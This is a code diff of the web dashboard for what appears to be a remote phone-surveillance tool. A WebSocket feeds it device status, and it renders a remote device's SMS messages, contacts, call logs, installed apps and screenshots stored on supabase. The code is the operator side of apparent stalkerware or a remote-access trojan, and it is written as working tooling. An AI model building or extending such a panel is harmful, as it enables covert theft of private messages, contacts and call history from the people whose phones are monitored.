-              statusEl.textContent = 'Online';
-              statusEl.className = 'badge online';
-              statusSmallEl.textContent = 'Online';
-              statusSmallEl.className = 'badge online';
-            } else {
-              statusEl.textContent = 'Offline';
-              statusEl.className = 'badge offline';
-              statusSmallEl.textContent = 'Offline';
-              statusSmallEl.className = 'badge offline';
-            }
-          }
-
-          if(msg.type === 'response' && msg.clientId === clientId){
-            pushLog(`📩 Response: ${msg.output}`);
-
-            // screenshots (supabase link)
-            if(typeof msg.output === 'string' && msg.output.includes('supabase.co')){
-              const url = msg.output.trim();
-              appendScreenshot(url);
-            }
-          }
-        } catch(e){
-          console.error('WS parse error', e);
-        }
-      };
+    // try to find JSON-like substring in text (e.g. server may send "RESPONSE: { ... }")
+    const jsonStart = text.indexOf("{");
+    const arrStart = text.indexOf("[");
+    if (jsonStart !== -1 || arrStart !== -1) {
+      const start = (arrStart !== -1 && arrStart < jsonStart) ? arrStart : jsonStart;
+      try {
+        const candidate = text.substring(start);
+        const p2 = JSON.parse(candidate);
+        return {parsed: p2};
+      } catch(e){ /* fall through */ }
     }
 
-    // --- append screenshot UI ---
-    function appendScreenshot(url){
-      const item = document.createElement('div'); item.className = 'shot';
-      const d = new Date();
-      const stampDisplay = `${d.getFullYear()}-${d.getMonth()+1}-${d.getDate()} ${d.getHours()}:${String(d.getMinutes()).padStart(2,'0')}:${String(d.getSeconds()).padStart(2,'0')}`;
-      const stampFile = `${d.getFullYear()}-${d.getMonth()+1}-${d.getDate()}_${d.getHours()}-${d.getMinutes()}-${d.getSeconds()}`;
-
-      const label = document.createElement('div'); label.className = 'meta'; label.innerText = `Captured: ${stampDisplay}`;
-      const img = document.createElement('img'); img.src = url; img.alt = 'screenshot';
-      img.addEventListener('click', ()=> {
-        const win = window.open('', '_blank');
-        win.document.write(`<html><head><title>Screenshot</title></head><body style="margin:0;background:#000;display:flex;align-items:center;justify-content:center;"><img src="${url}" style="max-width:100%;height:auto" /></body></html>`);
-      });
-
-      const actions = document.createElement('div'); actions.style.display='flex'; actions.style.gap='8px';
-      const dl = document.createElement('button'); dl.className='btn ghost'; dl.innerText='Download';
-      dl.addEventListener('click', async ()=>{
-        try{
-          const res = await fetch(url);
-          const blob = await res.blob();
-          const blobUrl = URL.createObjectURL(blob);
-          const link = document.createElement('a');
-          link.href = blobUrl;
-          link.download = `screenshot_${stampFile}.jpg`;
-          document.body.appendChild(link);
-          link.click();
-          link.remove();
-          URL.revokeObjectURL(blobUrl);
-        }catch(e){
-          pushLog('⚠️ Download failed: ' + e.message);
-        }
-      });
-
-      actions.appendChild(dl);
-      item.appendChild(label);
-      item.appendChild(img);
-      item.appendChild(actions);
-
-      // newest first
-      screenshotsContainer.prepend(item);
+    // try common prefix removal (APPS: [...]) or (SMS: {...})
+    const colonIndex = text.indexOf(":");
+    if (colonIndex !== -1) {
+      const prefix = text.slice(0, colonIndex).trim().toLowerCase();
+      const rest = text.slice(colonIndex+1).trim();
+      try {
+        const p = JSON.parse(rest);
+        return {parsed: p, prefix};
+      } catch(e){}
     }
 
-    // expose pushRemoteLog for external scripts
-    window.pushRemoteLog = pushLog;
-  </script>
+    return {raw: text};
+  }
+
+  // heuristics to detect type of array/object
+  function detectAndRender(parsed){
+    if (parsed == null) return;
+    // if it's an object with named keys like {apps: [...], sms: [...]} render each
+    if (typeof parsed === "object" && !Array.isArray(parsed)) {
+      const keys = Object.keys(parsed);
+      if (parsed.apps) renderApps(parsed.apps);
+      if (parsed.sms) renderSms(parsed.sms);
+      if (parsed.contacts) renderContacts(parsed.contacts);
+      if (parsed.calls) renderCalls(parsed.calls);
+      // If object itself looks like a single item (device info) -> log
+      pushLog("📩 Received object with keys: " + keys.join(", "));
+      return;
+    }
+
+    if (Array.isArray(parsed)) {
+      // examine first element to guess type
+      const first = parsed[0] || {};
+      if (first.package || first.packageName || first.appName || first.label) {
+        renderApps(parsed);
+        switchTab("apps");
+        return;
+      }
+      if (first.body || first.address || first.sender) {
+        renderSms(parsed);
+        switchTab("sms");
+        return;
+      }
+      if (first.number || first.callType || first.type) {
+        renderCalls(parsed);
+        switchTab("calls");
+        return;
+      }
+      if (first.name && (first.phone || first.phones)) {
+        renderContacts(parsed);
+        switchTab("contacts");
+        return;
+      }
+      // fallback: place into apps if large list (likely apps), else log
+      if (parsed.length > 10) {
+        renderApps(parsed);
+        switchTab("apps");
+      } else {
+        pushLog("📩 Received array (unknown format) - showing raw in Logs");
+        pushLog(JSON.stringify(parsed, null, 2));
+      }
+      return;
+    }
+
+    // otherwise not structured — show raw text in logs
+    pushLog("📩 Response: " + parsed);
+  }
+
+  // escape helper for text content
+  function escapeHtml(s){
+    if (s == null) return "";
+    return String(s)
+      .replace(/&/g, "&amp;")
+      .replace(/</g, "&lt;")
+      .replace(/>/g, "&gt;")
+      .replace(/\"/g, "&quot;");
+  }
+
+  // WebSocket for live updates
+  const wsProto = location.protocol === "https:" ? "wss://" : "ws://";
+  const ws = new WebSocket(wsProto + location.host);
+
+  ws.onopen = () => pushLog("🔌 WebSocket connected");
+  ws.onclose = () => pushLog("❌ WebSocket disconnected");
+  ws.onerror = (e) => pushLog("⚠️ WebSocket error");
+
+  ws.onmessage = (evt) => {
+    try {
+      const msg = JSON.parse(evt.data);
+      // device list update
+      if (msg.type === "devices") {
+        const d = msg.devices && msg.devices[clientId];
+        if (d && d.online) {
+          statusEl.textContent = "Online"; statusEl.className = "badge online";
+          statusSmallEl.textContent = "Online"; statusSmallEl.className = "badge online";
+        } else {
+          statusEl.textContent = "Offline"; statusEl.className = "badge offline";
+          statusSmallEl.textContent = "Offline"; statusSmallEl.className = "badge offline";
+        }
+      }
+
+      // command response for this client
+      if (msg.type === "response" && msg.clientId === clientId) {
+        // Log the raw output
+        pushLog("📩 Response received");
+        const out = (typeof msg.output === "string") ? msg.output.trim() : msg.output;
+
+        // If output contains supabase screenshot url, add screenshot
+        if (typeof out === "string" && out.includes("supabase.co")) {
+          // sometimes the server sends additional text; try to extract url(s)
+          const urls = extractUrls(out).filter(u=>u.includes("supabase.co"));
+          urls.forEach(u => addScreenshot(u));
+          // also show in logs
+          pushLog("🖼️ Screenshot URL(s) added: " + urls.join(", "));
+        }
+
+        // attempt parsing & rendering
+        const parsed = tryParseOutput(typeof out === "string" ? out : JSON.stringify(out));
+        if (parsed.parsed) {
+          detectAndRender(parsed.parsed);
+        } else if (parsed.raw) {
+          // raw text: maybe server sends "APPS: [...]" style
+          // try simple prefix heuristics
+          const low = String(parsed.raw);
+          if (low.toLowerCase().startsWith("apps:")) {
+            try {
+              const jsonPart = parsed.raw.slice(parsed.raw.indexOf(":")+1).trim();
+              const arr = JSON.parse(jsonPart);
+              renderApps(arr);
+              switchTab("apps");
+            } catch(e){
+              pushLog("📩 " + parsed.raw);
+            }
+          } else if (low.toLowerCase().startsWith("sms:")) {
+            try {
+              const jsonPart = parsed.raw.slice(parsed.raw.indexOf(":")+1).trim();
+              const arr = JSON.parse(jsonPart);
+              renderSms(arr);
+              switchTab("sms");
+            } catch(e){
+              pushLog("📩 " + parsed.raw);
+            }
+          } else if (low.toLowerCase().startsWith("calls:")) {
+            try {
+              const jsonPart = parsed.raw.slice(parsed.raw.indexOf(":")+1).trim();
+              const arr = JSON.parse(jsonPart);
+              renderCalls(arr);
+              switchTab("calls");
+            } catch(e){
+              pushLog("📩 " + parsed.raw);
+            }
+          } else {
+            // fallback — just log the raw output
+            pushLog(JSON.stringify(parsed.raw));
+          }
+        }
+      }
+    } catch(e) {
+      console.error("WS parse error", e);
+      pushLog("⚠️ WS parse error: " + e.message);
+    }
+  };
+
+  // small utility: extract URLs from text
+  function extractUrls(text){
+    if (!text) return [];
+    const re = /https?:\/\/[^\s'"]+/g;
+    const m = text.match(re);
+    return m || [];
+  }
+
+  // Expose pushRemoteLog for external use
+  window.pushRemoteLog = pushLog;
+
+  // Example: If you want to pre-clear containers on load:
+  appsContainer.innerHTML = "<div style='color:#8ea3b4'>No apps yet</div>";
+  smsContainer.innerHTML = "<div style='color:#8ea3b4'>No SMS yet</div>";
+  contactsContainer.innerHTML = "<div style='color:#8ea3b4'>No contacts yet</div>";
+  callsContainer.innerHTML = "<div style='color:#8ea3b4'>No call logs yet</div>";
+  screenshotsContainer.innerHTML = "<div style='color:#8ea3b4'>No screenshots yet</div>";
+
+</script>
 </body>
 </html>
